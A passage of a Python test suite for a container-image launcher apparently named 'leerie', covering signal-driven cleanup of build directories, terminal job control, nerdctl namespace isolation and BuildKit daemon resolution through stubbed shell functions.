                   env={"PATH": "/usr/bin:/bin",
                        "LEERIE_STATE_HOST_DIR": str(tmp_path)})
    deadline = time.monotonic() + 20
    while list(ib.iterdir()) and time.monotonic() < deadline:
        time.sleep(0.1)
    assert not list(ib.iterdir())


_BLOCKING_NERDCTL = r'''
nerdctl() {
  [ "${1:-}" = "--namespace" ] && shift 2
  case "${1:-}" in
    build) : > "$BUILDING"; read -r _ < "$FIFO" ;;
  esac
  return 0
}
'''


@pytest.mark.parametrize("sig", [signal.SIGTERM, signal.SIGHUP])
def test_a_signal_during_the_build_leaves_no_build_directory(tmp_path, sig):
    """A real signal to the launcher's shell while `build_repo_image`'s
    first build runs: the directory, context and all, is gone at once, and
    the shell dies of the signal. Falsified: the EXIT trap removed (both
    fail: the directory stays)."""
    repo = _two_branch_repo(tmp_path, "FROM scratch\nCOPY install.sh /\n")
    state = tmp_path / "state"
    state.mkdir()
    fifo, building = tmp_path / "fifo", tmp_path / "building"
    os.mkfifo(fifo)
    block = extract_block(_text(), "# --- a repository image's build",
                          BASE_BLOCK[1]) if "# --- a repository image's " \
        "build" in _text() else ""
    script = ("set -euo pipefail\n" + LOG_SH_SOURCE + FRONTEND_SH_SOURCE
              + BUILDCTL_STUB + 'remote_log() { echo "$*" >&2; }\n'
              + _BLOCKING_NERDCTL
              + _fns() + _launcher_fn("build_repo_image") + block
              + "\n_repo_image_prepare\nbuild_repo_image r:1\n")
    p = subprocess.Popen(["bash", "-c", script], start_new_session=True,
                         stdout=subprocess.DEVNULL, stderr=subprocess.PIPE,
                         env={"PATH": "/usr/bin:/bin", "USER_REPO": str(repo),
                              "LEERIE_STATE_HOST_DIR": str(state),
                              "IMAGE_TAG": "leerie:9.9.9",
                              "FIFO": str(fifo), "BUILDING": str(building)})
    try:
        deadline = time.monotonic() + 30
        while not building.exists() and time.monotonic() < deadline:
            time.sleep(0.05)
        assert building.exists(), p.stderr.read() if p.poll() is not None \
            else "the build never started"
        dirs = list((state / ".image-build").glob("b.*"))
        assert len(dirs) == 1 and (dirs[0] / "context" / "install.sh").exists()
        os.kill(p.pid, sig)
        assert p.wait(timeout=10) == -sig
        assert not list((state / ".image-build").glob("b.*"))
    finally:
        try:
            os.killpg(p.pid, signal.SIGKILL)
        except ProcessLookupError:
            pass
        p.wait(timeout=10)


_RELEASED_NERDCTL = r"""
nerdctl() {
  [ "${1:-}" = "--namespace" ] && shift 2
  case "${1:-}" in
    build) printf '%s\n' "$BASHPID" > "$BUILDING"; read -r _ < "$FIFO"
           shift; _stub_build_done "$@" ;;
  esac
  return 0
}
"""


def test_a_build_does_not_outlive_its_launch(tmp_path):
    """A SIGTERM to the launcher's PID alone while `build_repo_image`'s first
    build runs (review round 35, execution R35E-2): the build ends with the
    launch, so when it would have gone on to export its OCI layout, nothing
    writes the build directory again. Falsified: the build run in the
    foreground again (the orphaned build re-creates `b.<pid>.*/worker`), and
    `_build_job_end` dropped from `_repo_build_done` (the same)."""
    repo = _two_branch_repo(tmp_path, "FROM scratch\nCOPY install.sh /\n")
    state = tmp_path / "state"
    state.mkdir()
    fifo, building = tmp_path / "fifo", tmp_path / "building"
    os.mkfifo(fifo)
    block = extract_block(_text(), "# --- a repository image's build",
                          BASE_BLOCK[1])
    script = ("set -euo pipefail\n" + LOG_SH_SOURCE + FRONTEND_SH_SOURCE
              + BUILDCTL_STUB + 'remote_log() { echo "$*" >&2; }\n'
              + NERDCTL_IMAGE_INSPECT_STUB + _RELEASED_NERDCTL
              + _fns() + _launcher_fn("build_repo_image") + block
              + "\n_repo_image_prepare\nbuild_repo_image r:1\n")
    p = subprocess.Popen(["bash", "-c", script], start_new_session=True,
                         stdout=subprocess.DEVNULL, stderr=subprocess.PIPE,
                         env={"PATH": "/usr/bin:/bin", "USER_REPO": str(repo),
                              "LEERIE_STATE_HOST_DIR": str(state),
                              "IMAGE_TAG": "leerie:9.9.9",
                              "TMPDIR": str(tmp_path), "FIFO": str(fifo),
                              "BUILDING": str(building)})
    build_pid = 0
    try:
        deadline = time.monotonic() + 30
        while not (building.exists() and building.read_text().strip()) \
                and time.monotonic() < deadline:
            time.sleep(0.05)
        assert building.exists(), p.stderr.read() if p.poll() is not None \
            else "the build never started"
        build_pid = int(building.read_text())
        os.kill(p.pid, signal.SIGTERM)
        assert p.wait(timeout=10) == -signal.SIGTERM
        assert not list((state / ".image-build").glob("b.*"))
        try:
            fd = os.open(fifo, os.O_WRONLY | os.O_NONBLOCK)
        except OSError:
            fd = -1
        if fd >= 0:
            os.write(fd, b"go\n")
            os.close(fd)
        time.sleep(2)
        assert not list((state / ".image-build").rglob("*")), \
            "a build outlived its launch and wrote the build directory"
        assert not Path(f"/proc/{build_pid}").exists(), \
            "the build outlived its launch"
    finally:
        for pid in (build_pid, p.pid):
            try:
                pg = os.getpgid(pid) if pid else 0
            except ProcessLookupError:
                pg = 0
            if pg and pg != os.getpgrp():
                os.killpg(pg, signal.SIGKILL)
        p.wait(timeout=10)


# --- review round 36, execution X1 and X2: the job on a terminal -------------

# A bash 3.2 (macOS's /bin/bash) to run the same cases under, by path:
# LEERIE_TEST_BASH32=/path/to/bash-3.2.57/bash.
_BASH32 = os.environ.get("LEERIE_TEST_BASH32", "")
_SHELLS = [
    pytest.param(shutil.which("bash") or "/bin/bash", id="bash"),
    pytest.param(_BASH32, id="bash3.2", marks=pytest.mark.skipif(
        not (_BASH32 and os.access(_BASH32, os.X_OK)),
        reason="LEERIE_TEST_BASH32=<a bash 3.2 binary> runs these under it")),
]

# The build: one line of output through the relay, then a child of its own
# (as nerdctl's `buildctl` is) that blocks until released, re-creates
# `worker/` in the build directory as an export would, and exits 3.
_JOB_LAUNCHER = r"""
fake_build() {
  echo "STEP one"
  /usr/bin/bash -c 'echo $$ > "$1"; read -r _ < "$2"; /usr/bin/mkdir -p "$3/worker"; echo "STEP done"; exit 3' _ "$BUILDING" "$FIFO" "$_REPO_BUILD_DIR"
}
_repo_build_dir
_build_job fake_build || echo "rc=$?" >&2
echo "AFTER" >&2
"""


def _job_script() -> str:
    block = extract_block(_text(), "# --- a repository image's build",
                          BASE_BLOCK[1])
    return ("set -euo pipefail\n" + LOG_SH_SOURCE
            + 'remote_log() { echo "$*" >&2; }\n' + _fns() + block
            + _JOB_LAUNCHER)


def _release(fifo: Path) -> None:
    try:
        fd = os.open(fifo, os.O_WRONLY | os.O_NONBLOCK)
    except OSError:
        return
    os.write(fd, b"go\n")
    os.close(fd)


def _alive(pid: int) -> bool:
    try:
        return Path(f"/proc/{pid}/stat").read_text().split(") ")[1][0] != "Z"
    except (FileNotFoundError, IndexError):
        return False


@pytest.mark.parametrize("sh", _SHELLS)
@pytest.mark.parametrize("case", ["ctrl-c", "term", "hup", "tostop",
                                  "piped-ctrl-c", "no-tty"])
def test_a_build_job_on_a_terminal(tmp_path, sh, case):
    """`_build_job` and the launcher's EXIT trap, run as the launcher runs
    them, on a pty (all but `no-tty`). A signal mid-build (`ctrl-c` is
    the terminal's ^C, `term`/`hup` go to the launcher's PID alone,
    `piped-ctrl-c` is ^C with the launcher's output piped to `cat` under
    `tostop`): the launcher dies of that signal, the build's child is
    gone, the directory is gone and is not written again once released.
    `tostop` and `no-tty` (no controlling terminal, output piped): the
    build's output reaches the reader, the build's status (3) comes back
    and the launcher goes on. Falsified: `trap '' TTOU TTIN` dropped from
    the job (`tostop` hangs: the build's first line never arrives); the
    INT trap dropped from `_build_job` (bash 3.2's `ctrl-c` exits 129
    and its `piped-ctrl-c` reports status 129, instead of SIGINT)."""
    state = tmp_path / "state"
    state.mkdir()
    fifo, building = tmp_path / "fifo", tmp_path / "building"
    os.mkfifo(fifo)
    script = tmp_path / "launcher.sh"
    script.write_text(_job_script())
    env = {"PATH": "/usr/bin:/bin", "LEERIE_STATE_HOST_DIR": str(state),
           "FIFO": str(fifo), "BUILDING": str(building),
           "TMPDIR": str(tmp_path), "SH": sh, "SCRIPT": str(script)}
    out = b""
    if case == "no-tty":
        p = subprocess.Popen([sh, str(script)], start_new_session=True,
                             stdin=subprocess.DEVNULL, stdout=subprocess.PIPE,
                             stderr=subprocess.STDOUT, env=env)
        try:
            deadline = time.monotonic() + 30
            while not building.exists() and time.monotonic() < deadline:
                time.sleep(0.05)
            assert building.exists(), "the build never started"
            _release(fifo)
            out, _ = p.communicate(timeout=30)
        finally:
            if p.poll() is None:
                os.killpg(p.pid, signal.SIGKILL)
                p.wait(timeout=10)
        text = out.decode(errors="replace")
        assert p.returncode == 0, text
        assert "STEP one" in text and "STEP done" in text, text
        assert "rc=3" in text and "AFTER" in text, text
        assert not list((state / ".image-build").glob("b.*"))
        return
    if case == "piped-ctrl-c":
        argv = ["/usr/bin/bash", "-c", 'trap : INT; "$SH" "$SCRIPT" 2>&1 '
                '| /usr/bin/cat; echo "status=${PIPESTATUS[0]}"']
    else:
        argv = [sh, str(script)]
    # A session of its own whose controlling terminal is the pty
    # (`setsid --ctty`), spawned without running Python in a forked child.
    fd, slave = pty.openpty()
    if case in ("tostop", "piped-ctrl-c"):
        a = termios.tcgetattr(slave)
        a[3] |= termios.TOSTOP
        termios.tcsetattr(slave, termios.TCSANOW, a)
    proc = subprocess.Popen(["/usr/bin/setsid", "--ctty", *argv],
                            stdin=slave, stdout=slave, stderr=slave, env=env)
    os.close(slave)
    pid = proc.pid
    code = None
    build_pid = 0

    def pump(until: bytes, seconds: float) -> bool:
        nonlocal out, code
        deadline = time.monotonic() + seconds
        while time.monotonic() < deadline:
            r, _, _ = select.select([fd], [], [], 0.1)
            if r:
                try:
                    out += os.read(fd, 4096)
                except OSError:
                    pass
            if until and until in out:
                return True
            if code is None:
                code = proc.poll()
            if code is not None and not until:
                return True
        return False

    try:
        assert pump(b"STEP one", 15), \
            f"the build's first line never reached the terminal: {out!r}"
        deadline = time.monotonic() + 10
        while not (building.exists() and building.read_text().strip()) \
                and time.monotonic() < deadline:
            time.sleep(0.05)
        build_pid = int(building.read_text())
        if case == "tostop":
            _release(fifo)
            assert pump(b"AFTER", 15), out
            pump(b"", 15)
            text = out.decode(errors="replace")
            assert code == 0, text
            assert "STEP done" in text and "rc=3" in text, text
        else:
            if case in ("ctrl-c", "piped-ctrl-c"):
                os.write(fd, b"\x03")
            else:
                os.kill(pid, {"term": signal.SIGTERM,
                              "hup": signal.SIGHUP}[case])
            pump(b"", 15)
            text = out.decode(errors="replace")
            if case == "piped-ctrl-c":
                assert code == 0, text
                assert "status=130" in text, text
            else:
                want = {"ctrl-c": signal.SIGINT, "term": signal.SIGTERM,
                        "hup": signal.SIGHUP}[case]
                assert code == -want, (code, text)
            assert not list((state / ".image-build").glob("b.*")), text
            _release(fifo)
            time.sleep(1)
            assert not list((state / ".image-build").rglob("*")), \
                "a build outlived its launch and wrote the build directory"
            assert not _alive(build_pid), "the build outlived its launch"
    finally:
        for p_ in (build_pid,):
            if p_ and _alive(p_):
                os.kill(p_, signal.SIGKILL)
        if code is None:
            try:
                os.killpg(pid, signal.SIGKILL)
            except ProcessLookupError:
                pass
            proc.wait(timeout=10)
        for g in _leftover_groups(tmp_path):
            os.killpg(g, signal.SIGKILL)
        os.close(fd)



def _start_job(tmp_path: Path, sh: str) -> tuple[subprocess.Popen, int,
                                                   Path, Path, Path, dict]:
    """The launcher's job script under `sh`, in a session of its own on a
    pty; returns once the build's child runs: (process, pty master, state,
    fifo, building, env)."""
    state = tmp_path / "state"
    state.mkdir(exist_ok=True)
    fifo, building = tmp_path / "fifo", tmp_path / "building"
    if not fifo.exists():
        os.mkfifo(fifo)
    building.unlink(missing_ok=True)
    script = tmp_path / "launcher.sh"
    script.write_text(_job_script())
    env = {"PATH": "/usr/bin:/bin", "LEERIE_STATE_HOST_DIR": str(state),
           "FIFO": str(fifo), "BUILDING": str(building),
           "TMPDIR": str(tmp_path), "SH": sh, "SCRIPT": str(script)}
    fd, slave = pty.openpty()
    proc = subprocess.Popen(["/usr/bin/setsid", "--ctty", sh, str(script)],
                            stdin=slave, stdout=slave, stderr=slave, env=env)
    os.close(slave)
    deadline = time.monotonic() + 15
    while not (building.exists() and building.read_text().strip()) \
            and time.monotonic() < deadline:
        select.select([fd], [], [], 0.05)
        try:
            os.read(fd, 4096) if select.select([fd], [], [], 0)[0] else None
        except OSError:
            pass
    return proc, fd, state, fifo, building, env


def _twice(pid: int, sig: int, gap: float = 0.0005) -> None:
    """`sig` to `pid` twice, `gap` seconds apart (busy-waited): sent back
    to back, the kernel merges the two into one pending signal."""
    os.kill(pid, sig)
    end = time.perf_counter() + gap
    while time.perf_counter() < end:
        pass
    try:
        os.kill(pid, sig)
    except ProcessLookupError:
        pass


@pytest.mark.parametrize("sh", _SHELLS)
@pytest.mark.parametrize("sig", [signal.SIGHUP, signal.SIGINT],
                         ids=["HUP", "INT"])
def test_two_signals_a_millisecond_apart_still_clean_up(tmp_path, sh, sig):
    """A terminal that goes away (a closed window, a dropped ssh session)
    sends the launcher two SIGHUPs about a millisecond apart: its shell
    forwards one and the kernel's hangup sends one; a held ^C sends SIGINTs
    as close (review round 37, execution E1). Each time, the launcher dies
    of the signal, the build's child is gone and the build directory with
    it. Eight attempts with a 0.5 ms gap, since the race is per attempt
    (the review lost 15 and 11 of 20 at that gap). Falsified (2026-11-03):
    the cleanup left to the EXIT trap (`trap - SIG; kill -SIG $$`, or no
    trap): bash 5 died before its EXIT trap and the directory stayed."""
    for attempt in range(8):
        proc, fd, state, fifo, building, _ = _start_job(tmp_path, sh)
        build_pid = 0
        try:
            build_pid = int(building.read_text())
            _twice(proc.pid, sig)
            code = proc.wait(timeout=15)
            assert code == -sig, (attempt, code)
            assert not list((state / ".image-build").glob("b.*")), attempt
            _release(fifo)
            time.sleep(0.5)
            assert not _alive(build_pid), (attempt, "the build outlived it")
            assert not list((state / ".image-build").rglob("*")), attempt
        finally:
            if build_pid and _alive(build_pid):
                os.kill(build_pid, signal.SIGKILL)
            if proc.poll() is None:
                os.killpg(proc.pid, signal.SIGKILL)
                proc.wait(timeout=10)
            for g in _leftover_groups(tmp_path):
                os.killpg(g, signal.SIGKILL)
            os.close(fd)


def _proc_state(pid: int) -> str:
    try:
        return Path(f"/proc/{pid}/stat").read_text().split(") ")[1][0]
    except (FileNotFoundError, IndexError):
        return ""


@pytest.mark.parametrize("sh", _SHELLS)
def test_ctrl_z_stops_the_build_with_the_launcher(tmp_path, sh):
    """^Z at the operator's interactive shell, whose job the launcher is
    (as on a real terminal: a session leader's own group is orphaned, and
    the kernel drops ^Z's stop for it): the launcher stops, the build's
    group stops with it, and nothing reaches the terminal after the prompt
    while it is stopped; `fg` continues both, and the build finishes with
    its status (review round 37, execution E2). Falsified (2026-11-03):
    without the TSTP trap the build's child ran on, writing after the
    prompt."""
    state = tmp_path / "state"
    state.mkdir()
    fifo, building = tmp_path / "fifo", tmp_path / "building"
    os.mkfifo(fifo)
    script = tmp_path / "launcher.sh"
    script.write_text(_job_script().replace(
        "/usr/bin/bash -c 'echo $$ > \"$1\"; read -r _ < \"$2\";",
        "/usr/bin/bash -c 'echo $$ > \"$1\"; while [ ! -e \"$2.go\" ]; "
        "do echo tick; /usr/bin/sleep 0.2; done;"))
    env = {"PATH": "/usr/bin:/bin", "LEERIE_STATE_HOST_DIR": str(state),
           "FIFO": str(fifo), "BUILDING": str(building),
           "TMPDIR": str(tmp_path), "PS1": "OPSHELL$ ", "HOME": str(tmp_path)}
    fd, slave = pty.openpty()
    shell = subprocess.Popen(
        ["/usr/bin/setsid", "--ctty", "/usr/bin/bash", "--norc",
         "--noprofile", "-i"], stdin=slave, stdout=slave, stderr=slave,
        env=env)
    os.close(slave)
    out = b""

    def pump(until: bytes, seconds: float) -> bool:
        """Reads until `until` appears in what arrives from now on."""
        nonlocal out
        start = len(out)
        deadline = time.monotonic() + seconds
        while time.monotonic() < deadline:
            if select.select([fd], [], [], 0.1)[0]:
                try:
                    out += os.read(fd, 4096)
                except OSError:
                    return False
            if until and until in out[start:]:
                return True
        return False

    build_pid = 0
    try:
        assert pump(b"OPSHELL$ ", 10), out
        os.write(fd, f"{sh} {script}\n".encode())
        assert pump(b"tick", 15), out
        build_pid = int(building.read_text())
        os.write(fd, b"\x1a")
        assert pump(b"OPSHELL$ ", 10), out
        assert b"Stopped" in out, out
        time.sleep(1)
        assert _proc_state(build_pid) == "T", _proc_state(build_pid)
        mark = len(out)
        pump(b"", 2)
        assert b"tick" not in out[mark:], out[mark:]
        n = len(out)
        os.write(fd, b"fg; echo FG-RC=$?\n")
        assert pump(b"tick", 10), out[n:]
        Path(f"{fifo}.go").write_text("")
        assert pump(b"FG-RC=0", 20), out[n:]
        text = out[n:].decode(errors="replace")
        assert "STEP done" in text and "rc=3" in text and "AFTER" in text, \
            text
        assert not list((state / ".image-build").glob("b.*"))
    finally:
        if build_pid and _alive(build_pid):
            os.kill(build_pid, signal.SIGKILL)
        for g in _leftover_groups(tmp_path):
            os.killpg(g, signal.SIGKILL)
        if shell.poll() is None:
            os.killpg(shell.pid, signal.SIGKILL)
            shell.wait(timeout=10)
        os.close(fd)

def _leftover_groups(tmp_path: Path) -> list[int]:
    """Process groups still running a command line naming this test's
    directory, other than the test's own."""
    groups = set()
    me = os.getpgrp()
    for d in Path("/proc").iterdir():
        if not d.name.isdigit():
            continue
        try:
            cmd = (d / "cmdline").read_bytes()
            if str(tmp_path).encode() in cmd:
                g = os.getpgid(int(d.name))
                if g != me:
                    groups.add(g)
        except (OSError, ProcessLookupError):
            continue
    return sorted(groups)


def test_the_stage_traps_remove_a_live_build_directory_too(tmp_path):
    """Every EXIT trap that replaces the first one (after `$STAGE` is made,
    before `nerdctl run`, and the local run's) removes the build directory
    on a TERM, as written: the first two are live during a Fly launch's
    `ensure_image`, and the local run's keeps the rule for any build placed
    later (review round 35, claims R1). Falsified: `_repo_build_done`
    dropped from any one (fails for it)."""
    traps = [line.strip() for line in _text().splitlines()
             if line.strip().startswith("trap ")
             and line.endswith(" EXIT") and 'rm -rf "$STAGE"' in line]
    assert len(traps) == 3, traps
    for i, trap in enumerate(traps):
        st = tmp_path / f"s{i}"
        st.mkdir()
        script = ('remote_log() { :; }\n' + _fns()
                  + f'\nSTAGE="{st}/stage"; mkdir "$STAGE"\n'
                  '_stage_keepalive_pid=""\n' + trap + "\n_repo_build_dir\n"
                  'kill -TERM $$\n/usr/bin/sleep 5\n')
        subprocess.run(["bash", "-c", script], capture_output=True,
                       timeout=60, env={"PATH": "/usr/bin:/bin",
                                        "LEERIE_STATE_HOST_DIR": str(st)})
        assert not list((st / ".image-build").glob("b.*")), trap
        assert not (st / "stage").exists()


# --- review round 37, isolation I3: no build names an image of leerie's ------
# A build resolves a name the registry refuses from the image store of the
# containerd namespace its worker reads (DESIGN §6 *No build consumes what
# another build left in BuildKit*, *The image store*). Leerie keeps its
# images and containers in LEERIE_IMAGE_NS, which no worker may read.

# The namespace a nerdctl command in leerie's own scripts may name other
# than LEERIE_IMAGE_NS, each for its reason: the worker's (the base and the
# frontend copied there, leerie's old images swept out of it), and the
# namespace _container_ns found holding a run's container (`default` for a
# run an earlier leerie launched).
_OTHER_NS = {
    '"$_w"': "a namespace BuildKit's worker reads",
    '"$_n"': "_container_ns's lookup",
    '"$_cns"': "_reap_orphaned_container, from _container_ns",
    '"$_stop_cns"': "stop, from _container_ns",
    '"$_kill_cns"': "kill, from _container_ns",
    '"$_ns"': ("leerie_reap_old_images: $LEERIE_IMAGE_NS, or, with `worker`, "
               "a namespace BuildKit's worker reads other than it"),
    "$_w": "the refusal's instruction to the operator",
}


_NERDCTL_VERBS = {"--namespace", "build", "image", "images", "inspect",
                  "kill", "load", "pull", "push", "rm", "run", "save",
                  "stop", "tag", "create", "ps"}


def _nerdctl_calls(text: str) -> list[str]:
    """Each nerdctl invocation in a script's commands, as `nerdctl` and its
    next three words: one is `nerdctl` followed by an option or a verb (not
    prose, and not a verb closed by a backtick, which a comment or a
    docstring quotes), and not `info`, the reachability probe."""
    out = []
    for c in _commands(text):
        if c.lstrip().startswith(("remote_log ", "echo ", "printf ")):
            continue
        for m in re.finditer(r'(?<![\w"/.-])nerdctl((?:\s+\S+){1,3})', c):
            words = m.group(1).split()
            if words[0] not in _NERDCTL_VERBS or "`" in words[0]:
                continue
            out.append("nerdctl " + " ".join(words))
    return out


def test_every_nerdctl_command_names_leeries_namespace():
    """Derived from the scripts themselves: every nerdctl command the
    launcher and scripts/dockerfile-frontend.sh run starts with
    `--namespace`, naming LEERIE_IMAGE_NS or one of the few others above;
    so every one that builds, inspects, runs, tags, saves or removes an
    image of leerie's, or runs or stops its container, names leerie's.
    build-push.sh's nerdctl commands carry `ns_flags`, set to it. The
    counts are the converse: a site this scan cannot see leaves them short.
    Falsified (2026-11-03): `--namespace "$LEERIE_IMAGE_NS"` dropped from
    the wrap build, `_check_repo_image`'s inspect or the run (fails)."""
    leerie = _text()
    calls = _nerdctl_calls(leerie) + _nerdctl_calls(FRONTEND_SH.read_text())
    own = [c for c in calls
           if c.startswith('nerdctl --namespace "$LEERIE_IMAGE_NS" ')]
    other = [c for c in calls if c not in own]
    for c in other:
        ns = c.split()[2] if c.split()[1:2] == ["--namespace"] else None
        assert ns in _OTHER_NS, c
    verbs = sorted({c.split()[3] for c in own})
    # `ps`, `inspect` and `rm`: the launch's removal of its own container
    # and of what dead launches left (DESIGN §6 *A container a launch
    # starts never outlives that launch*), in leerie's namespace only.
    assert verbs == ["build", "image", "inspect", "kill", "ps", "rm", "run",
                     "save"], verbs
    assert len(own) == 21, own
    # The run's quoted forms (macOS `script`) name it too.
    assert leerie.count(
        '_nerdctl_run_quoted="nerdctl --namespace $LEERIE_IMAGE_NS run"') == 2
    # And prune's Python probe tries leerie's, then `default`.
    assert '["nerdctl", "--namespace", ns, "inspect", run_id]' in leerie
    assert 'LEERIE_PRUNE_CONTAINER_NS="$LEERIE_IMAGE_NS default"' in leerie
    bp = [c for c in _commands(BUILD_PUSH.read_text())
          if re.search(r'"\$build_cmd" (?!=)', c)]
    assert len(bp) == 4, bp
    for c in bp:
        assert '"$build_cmd" "${ns_flags[@]+"${ns_flags[@]}"}" ' in c, c
    assert 'ns_flags=(--namespace "$LEERIE_IMAGE_NS")' in \
        BUILD_PUSH.read_text()



@pytest.mark.skipif(not sys.platform.startswith("linux"), reason="reads /proc")
def test_the_launchers_run_and_its_image_are_in_leeries_namespace(tmp_path):
    """Run, not read: the real launcher, end to end against a stub
    `nerdctl`, looks its image up and runs its container in leerie's
    namespace. Falsified (2026-11-03): `--namespace "$LEERIE_IMAGE_NS"`
    dropped from the run (the stub sees none)."""
    from tests.launcher_stub_run import make_world, run_argv, run_to_end
    w = make_world(tmp_path)
    rc, out = run_to_end(w, ["--no-push", "a task"])
    assert rc == 0, out
    assert run_argv(w), out
    assert (w["world"] / "run.ns").read_text() == "leerie\n"
    calls = (w["world"] / "nerdctl.calls").read_text().splitlines()
    image = [c for c in calls if " image " in f" {c} " or " run " in f" {c} "]
    assert image and all(c.startswith("--namespace leerie ") for c in image), \
        calls

def test_leeries_namespace_is_its_own():
    """The namespace is a fixed name of leerie's, which no setup's worker
    reads: not `default` (nerdctl's, the standard rootless worker's) nor
    `buildkit` (Colima's)."""
    m = re.search(r'^LEERIE_IMAGE_NS="([^"]+)"$', FRONTEND_SH.read_text(),
                  re.M)
    assert m and m.group(1) == "leerie"


def _check_script(body: str) -> str:
    return ("set -uo pipefail\n" + FRONTEND_SH_SOURCE + BUILDCTL_STUB
            + 'remote_log() { echo "$*" >&2; }\n' + body)


@pytest.mark.parametrize("worker_ns,rc,refused", [
    ("default", 0, ""),
    ("buildkit", 0, ""),
    ("leerie", 0, "reads the containerd namespace leerie"),
    ("default", 1, "could not ask BuildKit"),
])
def test_a_repository_build_is_refused_on_a_worker_that_reads_leeries(
        tmp_path, worker_ns, rc, refused):
    """`build_repo_image` runs no build when BuildKit's worker reads
    leerie's namespace, or when BuildKit cannot be asked which namespace
    that is; it builds otherwise, on that daemon. Falsified (2026-11-03):
    the equality check removed from `leerie_buildkit_check` (the `leerie`
    case builds); the check removed from `build_repo_image` (both refusal
    cases build)."""
    repo = _two_branch_repo(tmp_path, "FROM scratch\nCOPY install.sh /\n")
    state = tmp_path / "state"
    state.mkdir()
    log = tmp_path / "nerdctl.log"
    script = _check_script(NERDCTL_IMAGE_INSPECT_STUB + _RECORD + _fns()
                           + _launcher_fn("build_repo_image")
                           + "\n_repo_image_prepare\nbuild_repo_image r:1\n"
                           "_repo_build_done\n")
    r = subprocess.run(["bash", "-c", script], capture_output=True,
                       text=True, timeout=120,
                       env={"PATH": "/usr/bin:/bin", "TMPDIR": str(tmp_path),
                            "NERDCTL_LOG": str(log), "IMAGE_TAG": "l:9",
                            "USER_REPO": str(repo),
                            "LEERIE_STATE_HOST_DIR": str(state),
                            "STUB_WORKER_NS": worker_ns,
                            "STUB_BUILDCTL_RC": str(rc)})
    builds = [x for x in log.read_text().splitlines() if _is_build(x)] \
        if log.exists() else []
    if refused:
        assert r.returncode == 1 and refused in r.stderr, r.stderr
        assert builds == []
    else:
        assert r.returncode == 0, r.stderr
        assert len(builds) == 2 and all(_LEERIE_BUILD.match(b)
                                        for b in builds), builds


_BUILDCTL_AT = r'''
buildctl() {
  echo "$2" >> "$BUILDCTL_LOG"
  case " $ANSWERS " in
    *" $2 "*)
      case "$2" in
        *buildkit-leerie/*) printf '%s\n' "${WORKERS_FIRST:-$WORKERS}" ;;
        *) printf '%s\n' "$WORKERS" ;;
      esac
      return 0 ;;
  esac
  return 1
}
'''
_W = ('[{"labels":{"org.mobyproject.buildkit.worker.containerd.namespace":'
      '"%s"}}]')


@pytest.mark.skipif(os.geteuid() == 0, reason="as root, nerdctl's runtime "
                    "directory is /run, not $XDG_RUNTIME_DIR")
@pytest.mark.parametrize("env,answers,workers,want", [
    # nerdctl's order: buildkit-<ns>, buildkit-default, buildkit.
    ({}, ["unix://R/buildkit-default/buildkitd.sock",
          "unix://R/buildkit/buildkitd.sock"], _W % "default",
     ("unix://R/buildkit-default/buildkitd.sock", "default", 2)),
    ({}, ["unix://R/buildkit/buildkitd.sock"], _W % "buildkit",
     ("unix://R/buildkit/buildkitd.sock", "buildkit", 3)),
    # BUILDKIT_HOST, which nerdctl takes first, is the only one asked.
    ({"BUILDKIT_HOST": "tcp://h:1"}, ["tcp://h:1",
     "unix://R/buildkit-default/buildkitd.sock"], _W % "ci",
     ("tcp://h:1", "ci", 1)),
    # The first that answers is nerdctl's, whatever its workers: one with
    # no containerd worker, or a label that is no namespace name, fails.
    ({"WORKERS_FIRST": '[{"labels":{}}]'},
     ["unix://R/buildkit-leerie/buildkitd.sock",
      "unix://R/buildkit-default/buildkitd.sock"], _W % "default", None),
    ({}, ["unix://R/buildkit-default/buildkitd.sock"], _W % "a b", None),
    ({}, [], _W % "default", None),
])
def test_resolve_finds_the_daemon_nerdctl_uses(tmp_path, env, answers,
                                                workers, want):
    """`leerie_buildkit_resolve` asks the daemons in nerdctl's order and
    takes the first that answers, reading its workers' containerd
    namespaces. Falsified (2026-11-03): skipping a daemon with no
    containerd worker for the next (the fourth case resolves)."""
    log = tmp_path / "buildctl.log"
    r = subprocess.run(
        ["bash", "-c", "set -uo pipefail\n" + FRONTEND_SH_SOURCE
         + _BUILDCTL_AT + 'if leerie_buildkit_resolve; then '
         'echo "OK $LEERIE_BUILDKIT_HOST|$LEERIE_BUILDKIT_WORKER_NS"; '
         'else echo FAIL; fi\n'],
        capture_output=True, text=True, timeout=60,
        env={"PATH": "/usr/bin:/bin", "XDG_RUNTIME_DIR": "R",
             "BUILDCTL_LOG": str(log), "ANSWERS": " ".join(answers),
             "WORKERS": workers, **env})
    asked = log.read_text().split() if log.exists() else []
    if want is None:
        assert r.stdout == "FAIL\n", (r.stdout, r.stderr)
    else:
        assert r.stdout == f"OK {want[0]}|{want[1]}\n", (r.stdout, r.stderr)
        assert len(asked) == want[2], asked
    if "BUILDKIT_HOST" not in env:
        assert asked == ["unix://R/buildkit-leerie/buildkitd.sock",
                         "unix://R/buildkit-default/buildkitd.sock",
                         "unix://R/buildkit/buildkitd.sock"][:len(asked)]


_BUILDCTL_DOWN = r'''
buildctl() {
  echo "error: listing workers: connection error: desc = \"transport: Error while dialing: dial unix ${2#unix://}: connect: no such file or directory\"" >&2
  return 1
}
'''


@pytest.mark.skipif(os.geteuid() == 0, reason="as root, nerdctl's runtime "
                    "directory is /run, not $XDG_RUNTIME_DIR")
def test_the_refusal_says_where_it_asked_and_why_it_failed(tmp_path):
    """Review round 38, execution X2: when no BuildKit daemon answers, the
    refusal names each address asked, buildctl's own last error, and what
    to do (start buildkitd, or set BUILDKIT_HOST), where it said only
    "could not ask BuildKit". Falsified live (2026-11-03): buildctl's
    stderr discarded again (no error in the refusal)."""
    r = subprocess.run(
        ["bash", "-c", "set -uo pipefail\n" + FRONTEND_SH_SOURCE
         + _BUILDCTL_DOWN + 'leerie_buildkit_check || '
         'echo "REFUSED $LEERIE_BUILDKIT_REFUSAL"\n'],
        capture_output=True, text=True, timeout=60,
        env={"PATH": "/usr/bin:/bin", "XDG_RUNTIME_DIR": "R"})
    out = r.stdout
    assert out.startswith("REFUSED could not ask BuildKit"), (out, r.stderr)
    for a in ("unix://R/buildkit-leerie/buildkitd.sock",
              "unix://R/buildkit-default/buildkitd.sock",
              "unix://R/buildkit/buildkitd.sock"):
        assert a in out, out
    assert ("(buildctl: error: listing workers: connection error: desc = "
            '"transport: Error while dialing: dial unix R/buildkit/'
            'buildkitd.sock: connect: no such file or directory")') in out
    assert "start buildkitd" in out and "set BUILDKIT_HOST" in out, out


_SWEEP_NERDCTL = r'''
nerdctl() {
  echo "$*" >> "$NERDCTL_LOG"
  [ "${1:-}" = "--namespace" ] || return 9
  local _ns="$2"; shift 2
